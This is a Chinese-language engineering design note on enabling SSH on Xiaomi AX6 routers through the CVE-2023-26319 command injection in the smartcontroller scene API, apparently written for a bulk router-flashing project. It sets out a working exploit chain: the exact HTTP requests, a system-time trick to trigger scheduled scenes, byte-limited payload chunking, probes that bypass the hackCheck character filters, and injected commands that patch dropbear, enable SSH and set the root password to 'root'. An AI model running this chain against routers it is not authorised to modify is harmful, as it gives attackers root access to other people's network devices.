# AX6 启用 SSH — smartcontroller 漏洞链路（CVE-2023-26319）

> **目标**：把"启用 SSH"步骤从"旁路路由器 WiFi 注入"换成"用路由器自己的 smartcontroller API 触发命令注入"，全程不需要辅助路由器。
> **来源**：`old_coding/Auto_Flash_Router/xmir-patcher/connect5.py`（作者 Julien R. / Marin Duroyon，2023 年公开）。

---

## TL;DR

| 项 | 值 |
|----|----|
| 前置 | 一个有效的 `stok`（步骤 2 拿到） |
| 后置 | 路由器 SSH 端口 22 可连，用户 `root` 密码 `root` |
| 耗时 | 30–60 秒（受时间同步等待影响） |
| 网络 | 全程 HTTP，单机直连路由器即可 |
| 失败回退 | 无（如果这条链路不通，目前 AX6 只能用旁路方案） |

**对比旧方案**：

| | 旁路注入（旧）| smartcontroller（新）|
|---|---|---|
| 辅助路由器 | 必需 | 不需要 |
| 物理操作 | 拔线 / 接 AP | 无 |
| 触发面 | 抓 5GHz 握手包 | HTTP API |
| 适合批量化 | ❌ | ✅ |

---

## 一、漏洞本身（CVE-2023-26319）

小米路由器有个"智能场景"功能：用户在前端配置一个"定时任务"（scene），到点自动跑一组动作（action_list）。每条 action 是个 JSON payload，里面有个 `wan_block` 类型的 `mac` 字段。

**后端处理逻辑（伪代码）**：

```c
int32_t run_sysapi_macfilter(char* mac, int32_t wan_block) {
    char cmdbuf[100];
    sprintf(&cmdbuf,
        "/usr/sbin/sysapi macfilter set mac=%s wan=%s;/usr/sbin/sysapi macfilter commit",
        mac, wan);
    return run_cmd(&cmdbuf);   // ← 直接拼进 system()，无转义
}
```

`mac` 字段没做转义，直接拼进 `system()`。所以传 `mac=;id;` 就能在路由器上跑任意命令。

**接口路径**：

```
POST /cgi-bin/luci/;stok=<stok>/api/xqsmarthome/request_smartcontroller
Content-Type: application/x-www-form-urlencoded
payload={"command":"scene_setting", ...}
```

注意：**`request_smartcontroller` 不在 `xqsystem` 也不在 `misystem` namespace**，是 `xqsmarthome` 下的独立 endpoint。原始 `1.official_init.py` 和 `2.login_get_stok.py` 用的全是 `xqsystem` / `misystem` / `xqnetwork`，**这个是新加的 namespace**。

---

## 二、为什么必须改系统时间

scene 是"定时"任务——后端用 `crontab` 调度，要到 `xx:yy` 分才跑。但我们要立刻跑，不能等几小时。

**trick**：

1. 探测路由器当前时间 `T0`（`GET /api/misystem/sys_time`）
2. 把路由器时间改到 `2033-01-02 03:04`（未来任意时刻）
3. 注册一个 scene，时间设为 `03:04`（也就是改后的"现在"），重复周期 `0`（只跑一次）
4. 触发 scene
5. 立即恢复路由器真实时间

**为什么设到 2033 而不是 +5 分钟**：避免 `crontab` 的"过去时间拒绝执行"逻辑——后端看到时间在过去会直接丢弃任务。设到 2033-01-02 03:04 是硬编码的安全未来时间点。

恢复时间：

```python
gw.set_device_systime(dst_original)  # dst_original 是探测时保存的原值
```

`set_sys_time` 内部会 `sleep(3.1)` 等 NTP 同步再返回，所以整条链路至少要 3 秒。

---

## 三、完整执行链（11 步）

```
1. POST /api/xqsmarthome/request_smartcontroller  payload={"command":"get_scene_setting"}
   → 验证 smartcontroller endpoint 存在；返回当前 scene 列表

2. POST ... payload={"command":"aaaaa;$"}   (probe)
   → 探测后端是否启用了 hackCheck 防护
      · 返回 {"msg":"api not exists"} → 没有防护，正常路径
      · 返回 "Internal Server Error"  → 启用了 hackCheck，分隔符要改用 \n 而不是 ;

3. GET /api/misystem/sys_time
   → 保存原系统时间 T0

4. POST /api/misystem/set_sys_time  time="2033-1-2 3:4:0" timezone=...
   → 把路由器时间设到 2033-01-02 03:04:00
   → 后端 sleep 3 秒才返回

5. POST ... payload={"command":"scene_setting", name="it3_0_1", action_list:[{...,"mac":"\n<cmd>\n"}], launch:{timer:{time:"3:4",...}}}
   → 注册 scene，mac 字段含命令注入
   → action_list 里的 type="wan_block" 触发 run_sysapi_macfilter

6. POST ... payload={"command":"scene_start_by_crontab", time:"3:4", week:0}
   → 立即触发该 scene
   → 可能返回 504 Gateway Time-out（路由器 sleep 3 秒是预期行为）→ 重试一次

7. POST ... payload={"command":"scene_delete", id:<scene_id>}
   → 清理 scene（避免下次误触发）

8. GET /api/misystem/sys_time
   → 验证时间已被改成 2033-01-02 03:04（确认 scene 真的执行了）
   → 没改成功 → 整条链路失败抛出

9. POST /api/misystem/set_sys_time  T0   (恢复原时间)

10. POST ... payload={"command":"scene_setting", ...} 多次，注入命令：
    · sed -i 's/release/XXXXXX/g' /etc/init.d/dropbear     # 解除 release 检查
    · nvram set ssh_en=1 ; nvram set telnet_en=1 ; nvram commit
    · echo root >/tmp/x  +  echo root >>/tmp/x  +  passwd root </tmp/x   # 改 root 密码
    · /etc/init.d/dropbear enable  +  /etc/init.d/dropbear restart

11. TCP 探测 192.168.31.1:22
    → 端口开放 → SSH 启用成功
    → 超时 → 失败
```

**关键观察**：步骤 5–7 是"探测链路能不能用"（用 `date -s 203301020304` 验证路由器时间被改），步骤 8 验证。**步骤 5–7 成功了才进步骤 10**。这是 "测一遍再下狠手" 的安全设计。

---

## 四、命令注入的字符级细节

每条 scene 注入的命令受 100 字节 cmdbuf 限制：

```
vuln_cmd = "/usr/sbin/sysapi macfilter set mac=;; wan=no;/usr/sbin/sysapi macfilter commit"
         = 76 字节（mac= 占位符为空 + 两侧 ; 占 2 字节）
实际可用 cmd 长度 = 100 - 76 = 24 字节
包裹后总长 = len(";" + cmd + ";") ≤ 23（即 cmd ≤ 21 字节）
```

**所以每条 `exec_tiny_cmd` 注入的命令 ≤ 21 字节**。超过就要走 `exec_cmd`（自动分块）。

> **历史勘误**：本节初版算成 62 字节是错的（`vuln_cmd` 的实际长度是 76 不是 38）。`3.enable_ssh.py` 用的 `MAX_CMD_LEN = 23` 是 2026-06-08 在 1.1.10 实测确认的值——`date -s 203301020304`（20 字节 + 两侧 `;`）刚好通过，更长的就 500。
> 实测 21 字节的 `passwd root </tmp/x` 也能通过。

**字符黑名单**：`"`, `\`, `` ` ``, `$`, `\n`

绕过方法：用 `echo -ne` 把字符写进文件（分块），再 `sh <file>` 跑：

```bash
# 比如想执行：sed -i 's/release/XXXXXX/g' /etc/init.d/dropbear
# 拆成三步：
echo -n "sed -i 's" > /tmp/e
echo "ne" >> /tmp/e   # \n 用 echo -ne 注入
echo "/release/XXXXXX/g' /etc/init.d/dropbear" >> /tmp/e
chmod +x /tmp/e
sh /tmp/e
```

`exec_cmd()` 工具函数就是干这个的——接受任意命令字符串，自动分块、调 `exec_tiny_cmd`（单次 scene 注入）多次拼装。

---

## 五、版本要求与 hackCheck

> **核心结论**：能不能用 smartcontroller 链路，**不取决于固件版本号字符串**（`1.1.10` / `1.0.16` 等），**而取决于运行时探测的 `hackCheck` 等级**——这是小米在服务端代码里加的字符过滤，跟前端固件版本号没强对应关系。

### 5.1 hackCheck 是什么

小米在某个时间点开始在服务端过滤"危险字符"——通过 XQSecureUtil 的 `filterChars` 规则集实现。`gateway.py:438` 的 `detect_hackCheck()` 通过给 `set_diag_paras` API 注入测试 payload 探测当前固件启用了哪一档过滤：

```python
# detect_hackCheck 的核心探测（gateway.py:444-466）
# 第一档：试 \n
self.set_diag_paras(usb_write_thr = 'simple_payload\n')   # 含换行
# EOFError → hackCheck = 3   规则 "[=[\n[`;|$&\n]]=]"   换行也被吃

# 第二档：试 ;
self.set_diag_paras(usb_write_thr = 'simple_payload;')     # 含分号
# EOFError → hackCheck = 2   规则 "[`;|$&]"              分号被吃（返回 nil）

# 第三档：试 ; 但读回值看是否被替换成空字符串
diag_paras = self.get_diag_paras()
# iperf_test_thr == 25（注入的 25，但 ; 之后的 payload 被吃）→ hackCheck = 1
# 规则 "[`;|$&]"                                              分号被替换为空（命令能跑但被切两半）
```

### 5.2 四档过滤规则详解

| hackCheck | 服务端 `filterChars` | 注入 `;` 的行为 | 注入 `\n` 的行为 | smartcontroller 状态 |
|-----------|---------------------|----------------|----------------|---------------------|
| **0** | 无过滤 | 直接执行 | 直接执行 | ✅ 完美 |
| **1** | `` `[`;|$&] `` → 替换为空字符串 | 后续命令丢失（被切） | `\n` 不在过滤集，能跑 | ⚠️ 改用 `\n` 仍可绕 |
| **2** | `` `[`;|$&] `` → 返回 nil | 整个 payload 被吃 | `\n` 不在过滤集，能跑 | ⚠️ 改用 `\n` 仍可绕 |
| **3** | `[=[\n[`` ` ``;|$&\n]]=]` → 返回 nil | 整个 payload 被吃 | 换行也被吃 | ❌ 完全不可用 |

> **注意 1 和 2 的区别**：v1 是"被切两半"（前半段能跑、后半段丢），v2 是"整个 payload 被吃"。对调用方来说，**都表现为 `Internal Server Error`**，得靠 `get_diag_paras` 读回值才能区分。
> **对 smartcontroller 来说，1 和 2 的应对方式相同**——把 `;` 换成 `\n` 就能绕过（v1/v2 都不过滤 `\n`）。

### 5.3 应对代码（写脚本时照抄）

```python
def detect_hack_check(ip: str, stok: str, timeout: int = 5) -> int:
    """运行时探测 hackCheck 等级。返回 0/1/2/3。"""
    # 调 set_diag_paras 三次探测（细节见 5.1）
    # ...

# 主流程里：
hack = detect_hack_check(ip, stok)
if hack >= 3:
    raise RuntimeError(
        f"smartcontroller 已被堵 (hackCheck={hack})，需降级固件或换链路"
    )
sep = '\n' if hack else ';'   # 1/2 都用 \n，0 用 ;
```

### 5.4 AX6 实测数据

| 固件 | hackCheck | smartcontroller | arn_switch (connect6) | get_icon (connect7) | 数据来源 |
|------|-----------|----------------|----------------------|---------------------|----------|
| 1.0.16（极老）| 0 | ✅ | ? | ? | ⚠️ **未实测**，xmir 老文档间接引用 |
| **1.1.10（当前实测）** | **0** | **✅** | ❌ `WARN: Exploits "arn_switch/..." not working` | ❌ 同上 | ✅ 2026-06-08 实跑日志 |
| 1.1.17+ | **未知** | **未知** | **未知** | **未知** | ⚠️ **未实测、未在 xmir 代码中找到任何提及**——不写瞎猜 |

> **重要**：除 1.1.10 之外的固件，**全都没有实测数据**。`hackCheck` 是服务端运行时属性，**不能从版本号字符串推断**——必须实机跑 `detect_hackCheck` 才能确定。新写脚本时**只能依赖运行时探测**，不准基于"1.1.17 估计 hackCheck=几"做判断。

**实测日志回顾**（2026-06-08）：

```
WARN: Exploits "arn_switch/start_binding/set_mac_filter/datacenter7" not working!!!
Enable smartcontroller scene executor ...
Wait smartcontroller activation ...
___[504]___
Unlock dropbear service ...
Unlock SSH server ...
Set password "root" for root user ...
Enabling dropbear service ...
Run SSH server on port 22 ...

#### SSH server are activated! ####
```

解读：
- 前两行 `WARN` 是 xmir 试 connect6 → connect7 全部失败，**这俩漏洞在 1.1.10 上已堵**
- `Enable smartcontroller scene executor` → 进入 connect5，hackCheck 探测为 0
- `___[504]___` → scene 触发时路由器 sleep 3 秒，预期内的超时
- 后面 4 行 `print` 是 `exec_cmd()` 注入的 4 条命令（patch dropbear / nvram / passwd / restart）

### 5.5 设计要求

写代码时**必须**遵守以下三条：

1. **不准硬编码** "1.1.10 一定 hackCheck=0"——`hackCheck` 是服务端运行时属性，固件升级可能改
2. **进入 smartcontroller 链路前必探测**，把探测到的 `hackCheck` 值**写进 JSON 输出**（`data.hack_check` 字段）——日后翻日志能判断固件兼容性
3. **hackCheck=3 立即抛错**（`ok:false error="..."`），不静默失败

### 5.6 与 xmir 的差异

xmir 的 `connect.py` 还有备选链路（connect6 / connect7）——同一固件上可能某个堵了另一个没堵，所以 xmir 会**依次试**：

```python
exp_modules = ['connect6', 'connect5', 'connect7']
for mod_name in exp_modules:
    try:
        import_module(mod_name, gw)
        break
    except (ExploitFixed, ExploitNotWorked):
        continue  # 试下一个
```

**本项目（src/project/）的策略**：先**只做 connect5 这条链路**（在 1.1.10 上验证可用），未来需要时再补 connect6/connect7 作为回退。原因：
- 6 个机型的首要任务是 AX6 跑通
- 多维护 N 条回退链路 = N 倍的代码 + 测试
- 真到全堵那天（hackCheck=3 全系固件）再说

---

## 六、API 总结（新加的 endpoint）

| 用途 | Endpoint | 鉴权 |
|------|----------|------|
| 智能场景 CRUD | `POST /api/xqsmarthome/request_smartcontroller` | 需要 stok |
| 读时间 | `GET /api/misystem/sys_time` | 需要 stok |
| 改时间 | `POST /api/misystem/set_sys_time` | 需要 stok |

**没有新 namespace**——`misystem` 在步骤 1/2 就用过了，新增的只有 `xqsmarthome`。

---

## 七、失败模式

| 现象 | 原因 | 处理 |
|------|------|------|
| `ExploitNotWorked: Smartcontroller return error` | hackCheck 等级过高（3+）| 抛出，让上层重试 connect6/connect7 |
| `ExploitNotWorked: Exploit "smartcontroller" not working` | scene 改了时间但路由器没执行 | 检查 32 秒循环里 `dxt` 是否变 2033 |
| `504 Gateway Time-out` | scene 触发的 3 秒 sleep | 视为成功（`___[504]___` 标记后 sleep + 跳过）|
| `scene_start_by_crontab` 返回 code != 0 | 调度失败 | 抛 `ExploitError` |
| TCP 22 探测超时 | dropbear 没起来 | 抛 SSH 失败 |

---

## 八、与本项目约定的对照

| 约定 | 本步骤如何落实 |
|------|---------------|
| stdout 单个 JSON | ✅ `{"ok":true,"step":"enable_ssh","data":{"ip":"...","ssh_port":22,"root_pwd":"root"}}` |
| stderr 默认静默，`--debug` 开启 | ✅ 11 步每步一行 `[INFO]` 日志 |
| 不硬编码密码 / stok | ✅ stok 来自 stdin 或 `--stok` 参数；root 密码 hardcode 为 `root`（这是路由器侧的 root 密码，跟 admin pwd 无关，固定值）|
| 单脚本独立可跑 | ✅ 不依赖其他 step；只依赖一个 stok 字符串 |
| 失败大声报错 | ✅ 任何一步失败立即抛 `RuntimeError`，JSON `ok:false` + 清晰 `error` |

---

## 九、上游依赖

```python
# 必须先有：
stok = "..."  # 来自 2.login_get_stok.py 的输出

# 调用方式：
python3 3.enable_ssh.py --stok "$stok" --ip 192.168.31.1 --debug
# 等待 ~30 秒，输出：
{"ok": true, "step": "enable_ssh", "data": {"ip": "192.168.31.1", "ssh_port": 22, "root_password": "root"}}
```

然后步骤 4+ 可以直接走 SSH：

```bash
sshpass -p root ssh -o StrictHostKeyChecking=no -oHostKeyAlgorithms=+ssh-rsa root@192.168.31.1
```

---

## 十、未尽事项（写代码前要先确认）

1. **hackCheck=1/2 的 `sep='\n'` 路径要不要写？** 当前 1.1.10 固件是 0，但其他固件可能是 1+。写代码时一并实现 `if hackCheck: sep = '\n'`，是低成本的兼容。
2. **执行时间改回 2033 还是改回原值？** 当前实现用 `set_device_systime(dst_original)` 恢复原值，更稳妥。
3. **命令执行后是否要 `chmod +x` 文件再 `sh` 跑？** exec_cmd 工具函数已经处理了，但**要不要**写死在 step 里？想想看：dropbear 的 restart 命令不需要写文件，直接 `sh` 字符串就够。
4. **stok 怎么传？** 选项：
   - `--stok <stok>` CLI 参数（简单）
   - `python3 2.login_get_stok.py | python3 3.enable_ssh.py`（管道，更符合 Unix 哲学）
   - **建议两个都支持**：先试 stdin JSON，再用 `--stok` 兜底。

---

## 参考

- `old_coding/Auto_Flash_Router/xmir-patcher/connect5.py` — 完整原始实现
- `old_coding/Auto_Flash_Router/xmir-patcher/gateway.py:368` — `get_device_systime` / `set_device_systime` 实现
- `old_coding/Auto_Flash_Router/xmir-patcher/connect.py:60` — exploit 链选择逻辑
- [CVE-2023-26319 公开说明](https://blog.thalium.re/posts/rooting-xiaomi-wifi-routers/) — Julien R. / Marin Duroyon 2023
